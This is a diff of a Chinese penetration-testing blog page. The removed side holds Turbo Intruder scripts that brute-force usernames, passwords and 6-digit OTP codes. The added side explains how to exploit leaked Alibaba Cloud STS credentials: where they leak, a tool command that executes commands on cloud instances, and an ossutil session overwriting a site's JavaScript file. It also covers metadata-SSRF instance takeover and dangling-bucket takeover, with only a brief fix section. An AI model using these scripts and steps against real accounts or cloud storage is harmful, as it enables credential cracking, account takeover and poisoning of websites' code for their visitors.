@@ -19,7 +19,7 @@
     <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,web安全,渗透测试,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶茶茶博客,茶茶blog">
 
 
-<title>Turbo Intruder并发脚本 | tea9のblog</title>
+<title>阿里云sts泄露导致任意文件覆盖 | tea9のblog</title>
 
 
 
@@ -207,7 +207,7 @@
 
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">Turbo Intruder并发脚本</h1>
+            <h1 class="post-title">阿里云sts泄露导致任意文件覆盖</h1>
             
                 <div class="post-meta">
                     
@@ -216,7 +216,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">八月 29, 2024&nbsp;&nbsp;13:55:13</a>
+                        Date: <a href="#">九月 12, 2024&nbsp;&nbsp;10:24:57</a>
                         </span>
                     
                     
@@ -232,14 +232,37 @@
         </header>
 
         <div class="post-content">
-            <h2 id="爆破用户名密码脚本"><a href="#爆破用户名密码脚本" class="headerlink" title="爆破用户名密码脚本"></a>爆破用户名密码脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from urllib import quote</span><br><span class="line"></span><br><span class="line">def password_brute(target,engine):</span><br><span class="line">  for word in open(&#x27;/Users/mac/safe/web/brute/mypass.txt&#x27;):</span><br><span class="line">        engine.queue(target.req, quote(word.rstrip()))</span><br><span class="line"></span><br><span class="line">def user_brute(target,engine):</span><br><span class="line">  for word in open(&#x27;/Users/mac/safe/web/brute/myuser.txt&#x27;):</span><br><span class="line">        engine.queue(target.req, quote(word.rstrip()))</span><br><span class="line">def user_password_brute(target, engine):</span><br><span class="line">  for password in open(r&quot;C:\Users\tea90\Downloads\f.txt&quot;):</span><br><span class="line">    for user in open(r&quot;C:\Users\tea90\Downloads\phone.txt&quot;):</span><br><span class="line">            engine.queue(target.req, [quote(user.rstrip()),quote(password.rstrip())])</span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">            concurrentConnections=30,</span><br><span class="line">            requestsPerConnection=100,</span><br><span class="line">            pipeline=False</span><br><span class="line">            )</span><br><span class="line">    #user_brute(target,engine)</span><br><span class="line">    #password_brute(target,engine)</span><br><span class="line">    user_password_brute(target,engine)</span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, req.wordcount, req.length and req.response</span><br><span class="line">    if req.status == 302:</span><br><span class="line">       table.add(req)</span><br></pre></td></tr></table></figure>
+            <h1 id="阿里云sts泄露导致任意文件覆盖"><a href="#阿里云sts泄露导致任意文件覆盖" class="headerlink" title="阿里云sts泄露导致任意文件覆盖"></a>阿里云sts泄露导致任意文件覆盖</h1><p>阿里云sts是临时的阿里云oss访问凭证，通常会有有效期，根据权限的不同可以进行不同的操作。<br>常见的漏洞是可以用来上传任意文件，或者替换原有文件。</p>
+<h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>oss浏览器下载：<a target="_blank" rel="noopener" href="https://github.com/aliyun/oss-browser">https://github.com/aliyun/oss-browser</a><br>将获取到的参数填写，endpoint、预设路径根据实际情况填写<br>ECS扫描 工具地址：<a target="_blank" rel="noopener" href="https://github.com/iiiusky/alicloud-tools">https://github.com/iiiusky/alicloud-tools</a></p>
+<p>行云管家：<a target="_blank" rel="noopener" href="https://yun.cloudbility.com/">https://yun.cloudbility.com/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看所有实例信息</span><br><span class="line"></span><br><span class="line">AliCloud-Tools.exe -a &lt;AccessKey&gt; -s &lt;SecretKey&gt; ecs –list</span><br><span class="line"></span><br><span class="line">AliCloud-Tools.exe -a &lt;AccessKey&gt; -s &lt;SecretKey&gt; ecs exec -I &lt;实例ID&gt; -c &quot;执行命令&quot;</span><br></pre></td></tr></table></figure>
 
-<p>去除编码  </p>
-<p>urllib.quote 函数来处理从文件中读取的每一行数据。这个函数通常用于URL编码，它会对某些特殊字符（如空格、@ 符号等）进行转义。然而，在你的情况下，如果文件中的 @ 符号被错误地转义，而你的目的是在密码或用户名中直接使用这些符号，那么你可能不需要使用 quote 函数。  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from urllib import quote</span><br><span class="line"></span><br><span class="line">def password_brute(target,engine):</span><br><span class="line">  for word in open(r&quot;C:\Users\tea90\Downloads\phone.txt&quot;):</span><br><span class="line">        engine.queue(target.req, quote(word.rstrip()))</span><br><span class="line"></span><br><span class="line">def user_brute(target,engine):</span><br><span class="line">  for word in open(&#x27;/Users/mac/safe/web/brute/myuser.txt&#x27;):</span><br><span class="line">        engine.queue(target.req, quote(word.rstrip()))</span><br><span class="line">def user_password_brute(target, engine):</span><br><span class="line">  for password in open(r&quot;C:\Users\tea90\Downloads\phone.txt&quot;):</span><br><span class="line">    for user in open(r&quot;C:\Users\tea90\Downloads\f.txt&quot;):</span><br><span class="line">            engine.queue(target.req, [user.rstrip(),password.rstrip()])</span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">            concurrentConnections=30,</span><br><span class="line">            requestsPerConnection=100,</span><br><span class="line">            pipeline=False</span><br><span class="line">            )</span><br><span class="line">    #user_brute(target,engine)</span><br><span class="line">    #password_brute(target,engine)</span><br><span class="line">    user_password_brute(target,engine)</span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, req.wordcount, req.length and req.response</span><br><span class="line">    if req.status != 404:</span><br><span class="line">       table.add(req)</span><br></pre></td></tr></table></figure>
 
-<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>竞争条件之：给两个不同的手机号发送otp会发送同样的otp</p>
-<h2 id="爆破6位数验证码"><a href="#爆破6位数验证码" class="headerlink" title="爆破6位数验证码"></a>爆破6位数验证码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def brute_veify_code(target, engine, length):</span><br><span class="line">    pattern = &#x27;1234567890&#x27;</span><br><span class="line">    for i in list(product(pattern, repeat=length)):</span><br><span class="line">         code =  &#x27;&#x27;.join(i)</span><br><span class="line">         engine.queue(target.req, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">            concurrentConnections=30,</span><br><span class="line">            requestsPerConnection=100,</span><br><span class="line">            pipeline=True</span><br><span class="line">            )</span><br><span class="line">    brute_veify_code(target, engine, 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, req.wordcount, req.length and req.response</span><br><span class="line">  if &#x27;error&#x27; not in req.response:</span><br><span class="line">       table.add(req)</span><br></pre></td></tr></table></figure>
+
+<h2 id="泄露常见位置"><a href="#泄露常见位置" class="headerlink" title="泄露常见位置"></a>泄露常见位置</h2><p>一般是上传文件时候会调用getsts&#x2F;STS&#x2F; 等接口，进行返回，一般都是设置了有效期</p>
+<p>&#x2F;api&#x2F;v2&#x2F;sts&#x2F;auth</p>
+<h2 id="常见返回字段"><a href="#常见返回字段" class="headerlink" title="常见返回字段"></a>常见返回字段</h2><p>SecurityToken&#x2F;AccessKeyId&#x2F;AccessKeySecret</p>
+<p>endpoint<br>bucketName<br>accessKeyId<br>accessKeySecret<br>securityToken<br>regionId</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;getSts&quot;:&#123;&quot;Credentials&quot;:&#123;&quot;SecurityToken&quot;:&quot;x&quot;,&quot;AccessKeyId&quot;:&quot;STS.x&quot;,&quot;AccessKeySecret&quot;:&quot;x&quot;,&quot;Expiration&quot;:&quot;2024-09-12T02:56:16Z&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h2><p><a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/oss/developer-reference/install-ossutil?spm=5176.12818093_-1363046575.top-nav.30.357216d0HVHa6a&scm=20140722.S_help@@%E6%96%87%E6%A1%A3@@120075.S_BB1@bl+BB2@bl+RQW@ag0+hot+os0.ID_120075-RL_ossutil-LOC_console~UND~help-OR_ser-V_3-P0_0#4c30f1a48ce9y">使用工具ossutil</a></p>
+<p>windows下载链接<br><a target="_blank" rel="noopener" href="https://gosspublic.alicdn.com/ossutil/1.7.19/ossutil-v1.7.19-windows-amd64.zip">https://gosspublic.alicdn.com/ossutil/1.7.19/ossutil-v1.7.19-windows-amd64.zip</a></p>
+<p>文件链接示例:<br>f-test.oss-cn-hangzhou.aliyuncs.com&#x2F;x-upload&#x2F;ff.js</p>
+<p>命令说明：<br>ossutil cp f.js oss:&#x2F;&#x2F;f-test&#x2F;x-upload&#x2F;ff.js  可以用来文件上传，如果文件存在可以进行文件覆盖</p>
+<p>命令示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#该命令创建将一个配置文件，在其中存储配置信息。 直接回车使用默认</span><br><span class="line">D:\tools\ossutil-v1.7.19-windows-amd64\ossutil-v1.7.19-windows-amd64&gt;ossutil config </span><br><span class="line"></span><br><span class="line">请输入endpoint：oss-cn-hangzhou.aliyuncs.com</span><br><span class="line">请输入accessKeySecret：x</span><br><span class="line">请输入stsToken：x</span><br><span class="line">请输入accessKeyID：STS.x</span><br><span class="line"></span><br><span class="line">D:\tools\ossutil-v1.7.19-windows-amd64\ossutil-v1.7.19-windows-amd64&gt;ossutil cp f.js oss://f-test/x-upload/ff.js</span><br><span class="line">cp: overwrite &quot;oss://x&quot;(y or N)? y</span><br><span class="line">Succeed: Total num: 1, size: 35,329. OK num: 1(upload 1 files).</span><br><span class="line"></span><br><span class="line">average speed 9000(byte/s)</span><br><span class="line"></span><br><span class="line">3.788097(s) elapsed</span><br></pre></td></tr></table></figure>
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.防止覆盖同名Object<br><a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/oss/user-guide/simple-upload?spm=a2c4g.11186623.0.0.7f845c7ecNZsfm">https://help.aliyun.com/zh/oss/user-guide/simple-upload?spm=a2c4g.11186623.0.0.7f845c7ecNZsfm</a><br><a target="_blank" rel="noopener" href="https://developer.aliyun.com/ask/127399?spm=a2c6h.13159741">https://developer.aliyun.com/ask/127399?spm=a2c6h.13159741</a></p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rIRYE0yTHfxWkCi5IBQxMw">【云安全】阿里云 OSS对象存储攻防</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/d_ckPiDwulUJ6bG_9lUKIw">漏洞实战 | 从存储桶sts泄露到js投毒</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jyaXtuqezRXi71RsTusYeg">『红蓝对抗』教你如何接管 阿里云 控制台</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WCDHoj0tOO-X1R2a5BvB2g">从CVE到接口sql注入再到后台接口fuzz一波三折最终接管整个阿里云（涉及百万信息泄露）</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rZhhzs6BDt5cCFQq3bU3cw">通过OSS浏览器劫持阿里云Bucket</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vN7vF6qlYDvOkzmJFgntPQ">云主机秘钥泄露（AK&#x2F;SK）及实战利用案例</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CSWtINxAxTyikOb-BH24mA">敏感信息泄露到接管云服务器</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ufzl7Zx5BoDIHUKXttOgNQ">【漏洞挖掘系列】OSS的STS模式授权案例</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/m2Z4cXoo6ltdopSSFVqNkQ">[AOH 026][1day]XSS全站用户?篡改厂商首页JS文件实战</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/flyweight_visitor/article/details/114187892">阿里云OSS访问小记</a></p>
+<h2 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h2><p>阿里云ssrf 用阿里云元数据可以进行ecs接管 <code>http://100.100.100.200/latest/meta-data</code></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YVZJLJ__qohScrzrV4avnA">https://mp.weixin.qq.com/s/YVZJLJ__qohScrzrV4avnA</a></p>
+<p>任意上传文件xss 替换原网站静态服务器域名可以造成原网站 xss 原理是oss服务器到静态资源服务会进行资源转发 </p>
+<p>阿里云OSS桶接管 接管删除的存储桶 </p>
+<blockquote>
+<p>原理：管理员通过域名解析绑定了一个存储桶，管理员不需要这个存储桶将器删除后，由于没有将域名解析的CNAME删除，就会出现下面的NoSuchBucket情况，要想接管该存储桶还需要一个前提就是需要在传输管理配置绑定域名，下面的情况可以接管存储桶。</p>
+</blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ShW6TFRwedloiLmQ7J6abA">https://mp.weixin.qq.com/s/ShW6TFRwedloiLmQ7J6abA</a></p>
+
         </div>
 <!--评论-->
    <script src="https://giscus.app/client.js"
@@ -269,7 +292,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://tea9.github.io/post/2207159039.html">http://tea9.github.io/post/2207159039.html</a></span>
+                        <span><a href="http://tea9.github.io/post/1724700741.html">http://tea9.github.io/post/1724700741.html</a></span>
                     </p>
                 
                 
@@ -306,10 +329,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/post/1724700741.html">阿里云sts泄露导致任意文件覆盖</a>
             
-            
-            <a class="next" rel="next" href="/post/3940617731.html">android应用中的xss和开放重定向payload</a>
+            <a class="next" rel="next" href="/post/2207159039.html">Turbo Intruder并发脚本</a>
             
         </section>
     </article>
